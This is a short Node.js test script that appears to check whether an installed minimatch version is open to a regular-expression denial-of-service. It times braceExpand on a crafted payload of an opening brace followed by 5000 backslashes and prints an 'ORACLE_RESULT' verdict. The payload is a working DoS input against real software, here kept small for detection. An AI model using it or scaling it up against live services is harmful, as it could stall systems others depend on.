const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const benign = minimatch.braceExpand('a{b,c}d');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'abd' || benign[1] !== 'acd') {
    throw new Error('benign_result_unexpected');
  }

  operation_completed = true;

  // Crafted to trigger expensive evaluation in vulnerable brace check /\{.*\}/
  // but remain bounded for quick completion.
  const payload = '{' + '\\'.repeat(5000);

  const t0 = Date.now();
  minimatch.braceExpand(payload);
  const elapsed = Date.now() - t0;

  // Vulnerable versions are measurably slower; patched versions shortcut quickly.
  const thresholdMs = 20;
  exploit_succeeded = elapsed >= thresholdMs;
  evidence = 'elapsed_ms=' + elapsed + ';payload_len=' + payload.length + ';threshold_ms=' + thresholdMs;
} catch (err) {
  if (!operation_completed) {
    evidence = 'setup_or_benign_error=' + (err && err.message ? err.message : String(err));
    operation_completed = false;
    exploit_succeeded = false;
  } else {
    exploit_succeeded = false;
    evidence = 'malicious_error=' + (err && err.name ? err.name : 'Error');
  }
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));